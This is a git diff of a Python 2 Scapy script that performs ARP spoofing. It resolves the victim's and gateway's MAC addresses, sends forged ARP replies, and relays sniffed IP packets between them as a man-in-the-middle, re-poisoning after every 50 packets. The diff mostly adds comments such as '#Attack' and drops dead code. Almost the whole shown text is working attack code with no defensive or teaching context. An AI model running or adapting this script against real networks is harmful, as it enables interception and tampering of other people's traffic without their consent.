@@ -7,7 +7,7 @@ arp_spoof = ARP()
 
 eth = neti.interfaces()[1]
 
-def arp_broadcast(arg_ip):
+def arp_broadcast(arg_ip): #Get Recever's Mac
     arp_bro = ARP()
 
     arp_bro.hwsrc = s_mac
@@ -27,7 +27,7 @@ s_mac = neti.ifaddresses(eth)[neti.AF_LINK][0]['addr']
 r_mac = arp_broadcast(r_ip)
 g_mac = arp_broadcast(g_ip)
 
-def arp_spoofing():
+def arp_spoofing(): #Attack
     arp_spoof.hwsrc = s_mac
     arp_spoof.hwdst = r_mac
     arp_spoof.psrc = g_ip
@@ -36,13 +36,7 @@ def arp_spoofing():
     send(arp_spoof)
     print "[+] ARP Spoofing is Done!"
 
-def spoofing_test():
-    sp_test.hwsrc = s_mac
-    sp_test.hwdst = r_mac
-    sp_test.psrc = g_ip
-    sp_test.pdst = r_ip
-
-def packet_relay(packet):
+def packet_relay(packet): #Packet Relay
     if (packet[IP].src == sys.argv[1] and packet[Ether].dst == s_mac):
         if packet[Ether].src == r_mac:
             packet[Ether].dst = g_mac
@@ -54,14 +48,10 @@ def packet_relay(packet):
             sendp(packet)
         print "[+] Packet Forwarding..."
 
-    #elif (packet[IP].src == sys.argv[1] and packet[Ether].dst != s_mac):
-    #    arp_spoofing()
-    #    print "[+] Re: ARP Spoofing is Done!"
-
 def main():
     arp_spoofing()
 
-    while(1):
+    while(1): #arp_spoofing attack after 50th sniffing
         sniff(prn=packet_relay,filter="ip", store=0, count=50)
         arp_spoofing()
 
